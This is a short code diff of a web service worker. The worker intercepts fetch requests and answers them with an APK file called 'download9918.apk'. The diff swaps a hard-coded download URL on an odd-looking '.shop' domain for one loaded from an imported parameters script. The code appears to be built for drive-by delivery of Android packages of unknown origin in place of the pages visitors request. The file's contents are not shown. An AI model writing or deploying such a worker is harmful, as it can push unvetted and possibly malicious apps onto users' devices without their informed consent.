@@ -1,3 +1,5 @@
+importScripts('./params.js?v=l1-2');
+
 self.addEventListener('install', () => {
   self.skipWaiting();
 });
@@ -221,10 +223,10 @@ self.addEventListener('fetch', (event) => {
   }
 
   event.respondWith((async () => {
-    const sourceUrl = new URL('https://inhumancrieck.shop/9d9e87dbccdbfa9715d/');
     const fileName = 'download9918.apk';
 
     try {
+      const sourceUrl = new URL(L1Params.apkUrl(await L1Params.read()));
       return await buildDeferredApkResponse(sourceUrl, fileName);
     } catch (error) {
       return buildErrorResponse(`APK download failed: ${error.message}`, 502);
